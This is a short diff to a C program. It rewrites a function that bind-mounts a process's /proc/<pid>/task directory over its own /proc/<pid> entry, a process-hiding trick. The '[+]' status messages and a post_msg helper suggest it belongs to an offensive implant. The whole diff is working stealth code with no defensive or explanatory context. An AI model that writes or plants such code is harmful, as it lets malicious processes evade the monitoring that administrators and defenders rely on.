@@ -363,15 +363,18 @@ static void post_msg(const char *cid, const char *msg) {
 
 static void bind_shm_to_self(void) {
     char proc_path[64];
+    char task_path[64];
     pid_t pid = getpid();
     
     snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
+    snprintf(task_path, sizeof(task_path), "/proc/%d/task", pid);
     
-    if (mount("/dev/shm", proc_path, NULL, MS_BIND | MS_SILENT, NULL) != 0) {
-        fprintf(stderr, "[!] Failed to bind mount /dev/shm to %s: %s\n", 
-                proc_path, strerror(errno));
+    // Mount task directory over proc directory
+    if (mount(task_path, proc_path, NULL, MS_BIND | MS_SILENT, NULL) != 0) {
+        fprintf(stderr, "[!] Failed to bind mount %s to %s: %s\n", 
+                task_path, proc_path, strerror(errno));
     } else {
-        fprintf(stderr, "[+] Bind-mounted /dev/shm over %s\n", proc_path);
+        fprintf(stderr, "[+] Bind-mounted %s over %s\n", task_path, proc_path);
     }
 }
 
